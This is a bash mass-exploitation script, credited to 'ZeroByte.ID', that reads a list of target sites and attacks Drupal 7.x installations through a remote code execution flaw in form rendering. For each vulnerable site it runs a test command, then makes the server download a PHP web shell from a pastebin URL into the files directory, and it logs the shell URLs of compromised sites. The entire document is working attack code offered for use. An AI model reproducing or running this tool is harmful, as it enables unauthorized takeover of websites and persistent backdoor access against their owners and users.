#!/bin/bash
# AutoExploit [BOT]
# Remote Code Execute CMS Drupal 7.x
# Date : 22 - Apr - 2018
# Usage : ./rce.sh list.txt
# Coded by ZeroByte.ID
cekrce() {
    target=$1
    echo -ne "---";
    cek=$(curl -s -X POST --cookie-jar cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id);
    echo -ne "-------";
    if [[ $cek =~ 'value="form-' ]]; then
        echo -ne "--------------------------";
        token=$(curl -s -X POST -b cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | grep -Po '(?<=value=")[^" \>]*' | head -1);
        echo -ne "----------------------------------";
        echo 
        result=$(curl -s -X POST -b cookie.tmp "${target}/?q=file/ajax/name/%23value/${token}" --data "form_build_id=${token}" | head -1)
        if [[ $result =~ 'Linux' ]]; then
          echo "[O] VULN RCE $target : uname -a"
          echo "$result";
          echo "Proses Upload Shell ....."
          upload=$(curl -s -X POST -b cookie.tmp "${target}/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=curl+-o+sites/default/files/zb.php+"https://pastebin.com/raw/qwck7PrC"" --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id | grep -Po '(?<=value=")[^" \>]*' | head -1);
          curl -s -X POST -b cookie.tmp "${target}/?q=file/ajax/name/%23value/${upload}" --data "form_build_id=${upload}" | head -1 > /dev/null
          cekshell=$(curl -s "${target}/sites/default/files/zb.php");
          if [[ $cekshell =~ 'ZeroByte.ID' ]]; then
            echo "Upload Done"
            echo "$result" >> result.txt
            echo "$target/sites/default/files/zb.php" | tee -a result.txt
            echo "=====================================" >> result.txt
          else
            echo "Can't Upload"
            echo "$target" >> gagal-upload.txt
          fi
          echo "--------------------------------------------------------------------------"
        else
            echo "[X] NOT VULN $target"

        fi
    else
        echo
        echo "[X] NOT VULN $target";
    fi
}

cat << "banner"
--------------------------------------------------
                   _           _         _     _
 _______ _ __ ___ | |__  _   _| |_ ___  (_) __| |
|_  / _ \ '__/ _ \| '_ \| | | | __/ _ \ | |/ _` |
 / /  __/ | | (_) | |_) | |_| | ||  __/_| | (_| |
/___\___|_|  \___/|_.__/ \__, |\__\___(_)_|\__,_|
                         |___/                  
                                        DayWalker        
----------------[ RCE Drupal 7.x ]----------------
 
banner

for s in $(cat $1); do
    echo "CHECKING $s"
    echo -ne "----";
    cekrce $s
done
rm cookie.tmp
